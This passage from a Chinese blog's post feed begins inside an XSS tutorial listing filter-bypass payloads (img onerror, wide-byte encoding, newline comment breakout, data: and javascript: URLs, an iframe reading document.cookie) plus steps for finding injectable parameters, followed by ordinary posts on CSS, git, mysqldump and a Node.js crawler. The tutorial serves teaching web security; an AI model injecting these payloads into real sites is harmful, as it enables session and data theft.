src=x onerror=alert(&quot;</span> <span class="attr">barret李靖</span>&quot;)=<span class="string">&quot;&quot;</span> &quot;=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">&lt;![&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;]&gt;&lt;img src=x onerror=alert(&quot;</span> <span class="attr">barret李靖</span>&quot;)=<span class="string">&quot;&quot;</span> &quot;=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;img src=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&quot;</span><span class="attr">Barret李靖</span>&quot;)//&quot;&quot;&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></comment><p><strong>7. 阻止编码</strong></p><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">t</span>=;alert(<span class="string">&quot;Barret李靖&quot;</span>)</span><br><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="built_in">var</span> <span class="built_in">t</span> = query(<span class="built_in">t</span>); // <span class="built_in">t</span> = <span class="string">&quot;&lt;quot;;alert(&quot;</span>Barret李靖<span class="string">&quot;)&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面可以看到 ";" 被编码了，观察页面编码：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;text/html; charset=gb18030&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>gbxxx系列编码，可以尝试宽字节：</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">?t=<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">22</span>alert<span class="comment">(&quot;Barret李靖&quot;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>8. 攻击单行注释</strong></p><p>URL对应的param中添加换行符（%0a）或者其他换行符。</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?t=%0aalert(<span class="string">&quot;Barret李靖&quot;</span>)//</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> init(<span class="string">&#x27;id&#x27;</span>, <span class="string">&quot;%0aalert(&quot;</span>Barret李靖<span class="string">&quot;)//&quot;</span>);</span><br><span class="line"></span><br><span class="line">被解析成</span><br><span class="line"></span><br><span class="line">// init(<span class="string">&#x27;id&#x27;</span>, <span class="string">&quot;</span></span><br><span class="line"><span class="string">alert(&quot;</span>Barret李靖<span class="string">&quot;)//&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>9. url</strong></p><p>url中可以使用很多协议 http:// // javascript: vbscript: data:等等，利用这些属性，可以找到很多的空隙。</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;data:text/html,&lt;script&gt;alert(&quot;</span> barret李靖<span class="string">&quot;)&lt;=&quot;</span><span class="string">&quot; script=&quot;</span><span class="string">&quot;&gt;&quot;</span>&gt;XSS&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>10. Flash跨域注入</strong></p><p>这个我不太熟悉，现在网页上Flash用的越来越少了，懒得继续看了。</p><p><strong>11. 利用事件</strong></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;#&quot;</span> <span class="attribute">onmouseover</span>=<span class="string">&quot;alert(document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>12. 利用标签</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">background</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></td></table><h3>四、XSS攻击实质</h3><p>XSS攻击没太多神奇的地方，就是利用浏览器防御不周到或者开发者代码不健壮，悄悄对页面或者服务器进行攻击。</p><p><strong>1. 绕过过滤</strong></p><p>URL中的 <code>&lt;</code>，在DOM XSS中，可以使用 \u003c (unicode编码)表示，不过他有可能被过滤了，最后解析成<code><lt;</code>，也可以使用 \x3c (Javascript 16进制编码)，<code>&gt;</code> 对应使用 \x3e。这种情况经常在 innerHTML 以及 document.write 中用到。</p><p>所谓的过滤包括人工过滤，也包括了浏览器HTML与JavaScript本身的过滤，程序员会在浏览器本身过滤过程中进行一些干扰和修改，这几个流程都给我们提供了很多 xss 攻击的入口。</p><p>1) 数据需要过滤，但是未过滤。导致XSS。比如：昵称、个人资料。</p><p>2) 业务需求使得数据只能部分过滤，但过滤规则不完善，被绕过后导致XSS。比如：日志、邮件及其它富文本应用。</p><p><strong>2. 利用源码中js的解析</strong></p><p>比如第二部分提出的第11点，浏览器的拦截</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">?t=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;Barret李靖&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样的插入会被拦截，当你发现源码中有这么一句话的时候：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseURL</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    t.<span class="built_in">replace</span>(<span class="string">&quot;WOW&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>便可以修改如上参数：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">t</span>=<span class="string">&quot;&gt;&lt;scrwowipt&gt;alert(&quot;</span>Barret李靖&quot;)&lt;/scrwowipt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接绕过了chrome浏览器对危险代码的防御。</p><h3>五、学会XSS攻击</h3><p><strong>1. 寻找可控参数</strong></p><p>攻击入口在哪里？一般是有输入的地方，比如URL、表单、交互等。</p><ul><li>含参数的URL中找到参数 value 值的输出点，他可能在html中输入，也可能是在javascript中</li><li>实验各种字符（&lt; , &gt; " '等），判断是否被过滤，测试方式，手动输入测试</li><li>确定可控范围，是否可以使用unicode编码绕过，是否可以使用HTML编码绕过，是否可以使用Javascript进制编码绕过等等</li></ul><p><strong>2. 开始注入</strong></p><p>注入细节上面都是，基本的思维模式：</p><ul><li>覆盖</li><li>阻断</li><li>利用特性</li></ul><p><strong>3. 修补注入错误</strong></p><p>注入后保证没有语法错误，否则代码不会执行，注入了也没用。这里的意思是，你注入的一个参数可能在脚本多处出现，你可以保证一处没语法错误，但是不能保证处处都正确</p><p><strong>4. 开搞</strong></p><p>测试的时候alert("Barret李靖"),弹出成功再继续其他更邪恶的注入方式。</p><h3>六、XSS分类</h3><p>为什么留到后面说。XSS也了解了很多次了，每次都是先从概念触发，感觉没啥意思，什么反射性、DOM型、储存型等等，还不如先去实践下，凭着自己对XSS的理解，多看几个网站的源码，找找乐趣。</p><p>存储型和反射型相比，只是多了输入存储、输出取出的过程。简单点说：</p><p>反射型是：输入--输出；存储型是：输入--进入数据库*--取出数据库--输出。</p><p>这样一来，大家应该注意到以下差别：</p><p>反射型是：绝大部分情况下，输入在哪里，输出就在哪里。存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</p><p>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中。</p><p>因而我们找存储型的时候，从一个地方输入数据，需要检测很多输出的点，从而可能会在很多点发现存储型XSS。</p><h3>七、辅助工具</h3><ol><li>http://ha.ckers.org/xsscalc.html</li><li>chrome插件 （xss Encode，百度之）</li><li>抓包工具，<a href="http://www.telerik.com/download/fiddler" target="_blank">fiddler4</a>  <a href="http://www.charlesproxy.com/latest-release/download.do" target="_blank">chales</a></li><li>白名单过滤工具<a href="//github.com/leizongmin/js-xss" target="_blank">github/js-xss</a></li></ol><h3>八、小结</h3><p>简单小结：</p><ul><li>< 号不应该出现在HTML的大部分节点中。</li><li>括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。</li><li>在ext节点里面，&lt;左尖括号有很大的危害。</li><li>引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。</li><li>。。。</li></ul><p>关注漏洞报告平台 Wooyun，多动脑筋，手动 hack。最重要的还是先黑客再红客。</p><h3>九、参考资料</h3><ul><li><a href="http://drops.wooyun.org/tips/689" target="_blank">http://drops.wooyun.org/tips/689</a></li><li><a href="http://drops.wooyun.org/tips/147" target="_blank">http://drops.wooyun.org/tips/147</a></li><li><a href="http://www.web-tinker.com/article/20468.html" target="_blank">http://www.web-tinker.com/article/20468.html</a></li><li><a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank">http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90</a></li><li><a href="//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> hack </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css选中前一个元素</title>
      <link href="/blog/2014/04/30/previous-element-with-css/"/>
      <url>/blog/2014/04/30/previous-element-with-css/</url>
      
        <content type="html"><![CDATA[<p>想了半天没找到 hack 的方式，CSS4 也没有提供类似的方法，不过在以后的草案中可能会出现 </p><pre><code>!previous + next &#123;&#125;</code></pre><p>这样选中上一个元素，那么就可以使用</p><p>!* + obj 来选中 obj 的前一个元素了</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git切换到远程分支</title>
      <link href="/blog/2014/04/30/switch-branch-in-git/"/>
      <url>/blog/2014/04/30/switch-branch-in-git/</url>
      
        <content type="html"><![CDATA[<p>远程仓库 git clone 下来，当你执行 git branch，你只会看到</p><pre><code>* master</code></pre><p>并不会看到其他分支，即便远程仓库上有其他分支，使用</p><pre><code>git branch -va</code></pre><p>可以查看本地+远程分支列表</p><pre><code>* master              0840594 merge master and 1.0.0remotes/origin/1.0.0  743012a &#39;update&#39;remotes/origin/2.0.0  2787838 udpateremotes/origin/HEAD   -&gt; origin/masterremotes/origin/master 0840594 merge master and 1.0.0</code></pre><p>如果想切换到 origin&#x2F;2.0.0 的分支，我们可以</p><pre><code>git branch remotes/origin/2.0.0</code></pre><p>不过结果并不如意：</p><pre><code>* (detached from origin/2.0.0)master</code></pre><p>git branch 会看到上面的信息，这里还需要一步操作：</p><pre><code>git checkout -b 2.0.0</code></pre><p>-b 的意思是 base，以当前分支为 base，新建一个名叫 2.0.0 的分支，这里当然也可以使用其他的命名。此时再执行 git branch 就能看到：</p><pre><code>$ git br  master* 2.0.0</code></pre><p>就 OK 了~</p><p>最直接的方法是：</p><pre><code>git checkout -t origin/2.0.0</code></pre><p>能够直接新建本地分支，将远程分支提取出来。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解析URL到对应的Object</title>
      <link href="/blog/2014/04/29/reverse-string-to-object/"/>
      <url>/blog/2014/04/29/reverse-string-to-object/</url>
      
        <content type="html"><![CDATA[<p>将 URL 中对象解析出来：</p><pre><code>var a=&#39;account.type=1&amp;account.id=&amp;account.dependFlag=0&amp;account.card.companyId=1&amp;account.name=%E4%B8%AD%E9%93%B6VISA%E5%8D%A1&amp;account.hidden=&amp;account.card.cardNo=&amp;account.moneyTypeId=0&amp;account.card.billDay=1&amp;account.card.repayType=0&amp;account.card.repayDay=20&amp;account.card.alert=2&amp;account.comment=%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D&#39;;var root=&#123;&#125;;a.split(&#39;&amp;&#39;).sort().map(function(s)&#123;    var p=root;    s.match(/(.+?)(?:\.|=)/g).map(function(ss)&#123;        var t=ss.slice(0,-1);        p[t]=p[t]||((ss.slice(-1)===&#39;=&#39;)?decodeURIComponent(s.match(/=(.*)$/)[1]):&#123;&#125;);        p=p[t];    &#125;);&#125;);console.log(root);</code></pre><p>以上是网友的答案，我暂时没想到更好的算法。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysqldump的使用</title>
      <link href="/blog/2014/04/29/useage-of-mysqldump/"/>
      <url>/blog/2014/04/29/useage-of-mysqldump/</url>
      
        <content type="html"><![CDATA[<ol><li><p>导出整个数据库<br>mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名  </p><pre><code>  mysqldump -u wcnc -p smgp_apps_wcnc &gt; wcnc.sql</code></pre></li><li><p>导出一个表<br>mysqldump -u 用户名 -p 数据库名 表名&gt; 导出的文件名</p><pre><code>  mysqldump -u wcnc -p smgp_apps_wcnc users&gt; wcnc_users.sql</code></pre></li><li><p>导出一个数据库结构</p><pre><code>   mysqldump -u wcnc -p -d --add-drop-table smgp_apps_wcnc &gt;d:\wcnc_db.sql</code></pre><p>-d 没有数据 –add-drop-table 在每个create语句之前增加一个drop table </p></li><li><p>导入数据库<br>常用source 命令<br>进入mysql数据库控制台，<br>如mysql -u root -p </p><p>mysql&gt;use 数据库<br>然后使用source命令，后面参数为脚本文件（如这里用到的.sql）</p><pre><code>   mysql&gt;source d:\wcnc_db.sql</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> mysqldump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NodeJS写个爬虫，把文章放到kindle中阅读</title>
      <link href="/blog/2014/04/28/cb-spider-with-node/"/>
      <url>/blog/2014/04/28/cb-spider-with-node/</url>
      
        <content type="html"><![CDATA[<p>这两天看了好几篇不错的文章，有的时候想把好的文章 down 下来放到 kindle 上看，便写了个爬虫脚本，因为最近都在搞 node，所以就很自然的选择 node 来爬咯～</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/spider-with-node.html">http://www.cnblogs.com/hustskyking/p/spider-with-node.html</a>，转载请注明源地址。</p><p>所谓爬虫，可以简单理解为利用程序操作文件，只是这些文件不在本地，需要我们拉取过来。</p><h3>一. 爬虫代码解析</h3><h4>1. 拿到目标页码源码</h4><p>Node 提供了很多接口来获取远程地址代码，就拿 AlloyTeam 的页面举例吧，把他首页几篇文章的信息爬取过来。因为 AlloyTeam 使用的协议是 http:// ，本文就不介绍 Node 中 // 的使用了。</p><figure class="highlight qml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">url</span> = <span class="string">&quot;http://www.alloyteam.com/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个请求</span></span><br><span class="line"><span class="keyword">var</span> req = http.request(<span class="built_in">url</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 设置显示编码</span></span><br><span class="line">    res.setEncoding(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    <span class="comment">// 数据是 chunked 发送，意思就是一段一段发送过来的</span></span><br><span class="line">    <span class="comment">// 我们使用 data 给他们串接起来</span></span><br><span class="line">    res.on(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">        data += chunk;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 响应完毕时间出发，输出 data</span></span><br><span class="line">    res.on(<span class="string">&#x27;end&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// dealData(data);</span></span><br><span class="line">        <span class="built_in">console</span>.log(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送请求</span></span><br><span class="line">req.end();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面短短七八行代码，就拿到了 AlloyTeam 首页的代码，真的十分简单，如果是 // 就得引用 https 模块咯，都是差不多的。</p><h4>2. 正则提取目标内容</h4><p>先看下我们要抓取的内容：&nbsp;</p><p><img src="https://images.cnitblog.com/i/387325/201404/280127061279284.png" alt=""></p><p>由于没有使用其他库，我们没办法像操作 DOM 一样获取目标内容，不过写正则也挺简单的，比如我们要 获取标题/文章链接/摘要 这些内容，正则表达式为：</p><figure class="highlight pony"><table><tr><td class="code"><pre><span class="line"><span class="comment">// function dealData</span></span><br><span class="line"><span class="keyword">var</span> reg = /&lt;ul\s+<span class="keyword">class</span>=<span class="string">&quot;articlemenu&quot;</span>&gt;\s+&lt;li&gt;\s+&lt;a[^&gt;]*&gt;.*?&lt;\ a=<span class="string">&quot;&quot;</span>&gt;\s+&lt;a href=<span class="string">&quot;(.*?)&quot;</span> [^=<span class="string">&quot;&quot;</span>&gt;]*&gt;(.*?)&lt;\ a=<span class="string">&quot;&quot;</span>&gt;[\s\<span class="type">S</span>]*?&lt;div\s+<span class="keyword">class</span>=<span class="string">&quot;text&quot;</span>&gt;([\s\<span class="type">S</span>]*?)&lt;\ div=<span class="string">&quot;&quot;</span>&gt;/g;</span><br><span class="line"><span class="keyword">var</span> res = [];</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">match</span> = reg.exec(data)) &#123;</span><br><span class="line">    res.push(&#123;</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="keyword">match</span>[<span class="number">1</span>],</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="keyword">match</span>[<span class="number">2</span>],</span><br><span class="line">        <span class="string">&quot;excerpt&quot;</span>: <span class="keyword">match</span>[<span class="number">3</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;&#x2F;&gt;&lt;&#x2F;div\s+class&#x3D;”text”&gt;&lt;&#x2F;&gt;</a>&lt;&#x2F;&gt;&lt;&#x2F;a[^&gt;</li>&lt;&#x2F;ul\s+class&#x3D;”articlemenu”&gt;</p><p>这里的正则看起来有点晦涩，不过呢，正则在编程中十分基础的东西，如果没有太多的了解，建议先去搞清楚，这里就不细说啦。这里要强调的一点是：</p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">reg</span>.exec(<span class="class"><span class="keyword">data</span>);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果只写上面这句话，只会拿到第一个匹配结果，所以需要使用 while 循环来处理，没处理一次，正则匹配的位置就会往后推一下。其实上面这条语句执行后返回的是一个对象，其中包含一个 index 属性，具体可以查阅 JavaScript 正则的内容。</p><p>这里返回（res）的数据格式是：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">    <span class="string">&quot;url: url,</span></span><br><span class="line">    <span class="string">&quot;title&quot;</span>: title,</span><br><span class="line">    <span class="string">&quot;excerpt&quot;</span> excerpt</span><br><span class="line">&#125;];</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>3. 数据的过滤</h4><p>上面虽然拿到了内容，不过我们需要的是纯文本，其他标签什么的得过滤掉，excerpt 中包含了一些标签：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> excerpt = excerpt.<span class="built_in">replace</span>(<span class="regexp">/(&lt;.*?&gt;)((.*?)(&lt;.*?&gt;))?/g</span>, <span class="string">&quot;$3&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;&#x2F;.*?&gt;&lt;&#x2F;.*?&gt;</p><p>虽说文章中有很多代码，有些标签是不应该删除的，不过这里是摘要内容，这些内容的标签都删除掉，方便我们储存。然后把长度处理下：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">excerpt</span> = excerpt.slice(<span class="number">0</span>, <span class="number">120</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>4. 存到数据库（或者文件）</h4><p>我这里是把文件储存到文件之中，存放格式为：</p><figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line">[title](url)</span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">excerpt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>哈哈，很熟熟悉吧，markdown 语法，看起来也比较清晰。</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="operator">=</span> <span class="number">0</span>, len <span class="operator">=</span> data.length; i <span class="operator">&lt;</span> len; i<span class="operator">++</span>)&#123;</span><br><span class="line">    str <span class="operator">+=</span> <span class="string">&quot;[&quot;</span> <span class="operator">+</span> data[i].title <span class="operator">+</span> <span class="string">&quot;](&quot;</span> <span class="operator">+</span> data[i].url <span class="operator">+</span> <span class="string">&quot;)<span class="subst">\n</span>&quot;</span> <span class="operator">+</span> data[i].excerpt.replace(<span class="string">&quot;<span class="subst">\n</span>\s*<span class="subst">\n</span>?&quot;</span>, <span class="string">&quot;&gt;<span class="subst">\n</span>&quot;</span>) <span class="operator">+</span> <span class="string">&quot;<span class="subst">\n</span><span class="subst">\n</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先拼接数据，然后写入到文件：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">fs.writeFile(<span class="string">&#x27;index.md&#x27;</span>, str, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) throw err;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;数据已保存～&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大功告成，过程其实是很简单的。拿到的内容（Linux 下，字体真丑！）：</p><p><img src="https://images.cnitblog.com/i/387325/201404/280128134707391.png" alt=""></p><h3>二. 源码与小结</h3><p>如果对正则不太熟悉，上面的工作是不太好完成的，很多开发者为 Node 提供了工具库，使用 npm 可以安装，如果不习惯正则，使用一些工具包辅助处理，可以把拿到的数据当作 DOM 来解析。</p><p>我了解到的有一个叫做 node-jquery 的库貌似还不错，具体请读者自己去网上搜吧，应该挺多的。</p><p>上面的代码都是随手写的，没有做什么容错的机制，也只爬取了首页的内容，不过思路都是一样的，拿到 URL 之后再写个循环，其他页面的内容也就到手了。</p><p>源码没几行：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> http = require(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = require(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://www.alloyteam.com/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> req = http.request(url, <span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">    res.setEncoding(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    res.on(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>)&#123;</span><br><span class="line">        data += chunk;</span><br><span class="line">    &#125;);</span><br><span class="line">    res.on(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        dealData(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">req.on(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    throw e;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">req.end();</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;数据下载中...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dealData</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> reg = <span class="regexp">/&lt;ul\s+class=&quot;articlemenu&quot;&gt;\s+&lt;li&gt;\s+&lt;a[^&gt;]*&gt;.*?&lt;\ a=&quot;&quot;&gt;\s+&lt;a href=&quot;(.*?)&quot; [^=&quot;&quot;&gt;]*&gt;(.*?)&lt;\ a=&quot;&quot;&gt;[\s\S]*?&lt;div\s+class=&quot;text&quot;&gt;([\s\S]*?)&lt;\ div=&quot;&quot;&gt;/g</span>;</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    <span class="keyword">while</span>(match = reg.exec(data)) &#123;</span><br><span class="line">        res.<span class="built_in">push</span>(&#123;</span><br><span class="line">            <span class="string">&quot;url&quot;</span>: match[<span class="number">1</span>],</span><br><span class="line">            <span class="string">&quot;title&quot;</span>: match[<span class="number">2</span>],</span><br><span class="line">            <span class="string">&quot;excerpt&quot;</span>: match[<span class="number">3</span>].<span class="built_in">replace</span>(<span class="regexp">/(&lt;.*?&gt;)((.*?)(&lt;.*?&gt;))?/g</span>, <span class="string">&quot;$3&quot;</span>).<span class="built_in">slice</span>(<span class="number">0</span>,<span class="number">120</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    writeFile(res)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">writeFile</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = data.<span class="built_in">length</span>; i &lt; len; i++)&#123;</span><br><span class="line">        str += <span class="string">&quot;[&quot;</span> + data[i].title + <span class="string">&quot;](&quot;</span> + data[i].url + <span class="string">&quot;)\n&gt;&quot;</span> + data[i].excerpt.<span class="built_in">replace</span>(<span class="regexp">/\n\s*\n?/g</span>, <span class="string">&quot;\n&gt;&quot;</span>) + <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fs.writeFile(<span class="string">&#x27;index.md&#x27;</span>, str, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (err) throw err;</span><br><span class="line">       <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;数据已保存～&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 node 环境中：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">node</span> <span class="title">spider</span>.js</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就可以在同级目录下看到 index.md 文件了。至于如何放到 kindle 中，先了解下 <a href="http://www.idpf.org/epub/20/spec/OPF_2.0.1_draft.htm" target="_blank">OPF</a> 格式，然后使用 Amazon 的 <a href="http://www.amazon.com/gp/feature.html?ie=UTF8<docId=1000765211" target="_blank">KindleGen</a> 工具打包就行啦。</p><h3>三. 参考资料</h3><ul><li><a href="http://nodejs.org/api/fs.html">http://nodejs.org/api/fs.html</a></li><li><a href="http://nodejs.org/api/http.html">http://nodejs.org/api/http.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> NodeJS </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git版本回退操作</title>
      <link href="/blog/2014/04/28/git-roll-back/"/>
      <url>/blog/2014/04/28/git-roll-back/</url>
      
